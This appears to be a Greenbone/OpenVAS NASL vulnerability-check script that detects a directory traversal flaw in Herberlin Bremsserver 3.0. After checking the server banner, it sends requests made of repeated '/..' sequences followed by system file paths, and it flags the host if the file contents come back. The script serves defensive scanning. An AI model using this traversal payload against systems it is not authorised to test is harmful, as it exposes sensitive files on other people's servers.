if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902587" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-11-18 12:12:12 +0530 (Fri, 18 Nov 2011)" );
	script_name( "Herberlin Bremsserver Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://tools.herberlin.de/bremsserver/index.shtml" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/107070/HerberlinBremsserver3.0-233.py.txt" );
	script_xref( name: "URL", value: "http://www.autosectools.com/Advisory/Herberlin-Bremsserver-3.0-Directory-Traversal-233" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_mandatory_keys( "Herberlin_Bremsserver/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "Herberlin Bremsserver Version 3.0" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of URI containing ../(dot dot)
  sequences, which allows attackers to read arbitrary files via directory traversal attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Herberlin Bremsserver and is prone to directory
  traversal vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: Herberlin Bremsserver" )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( crap( data: "/..", length: 49 ), files[file] );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

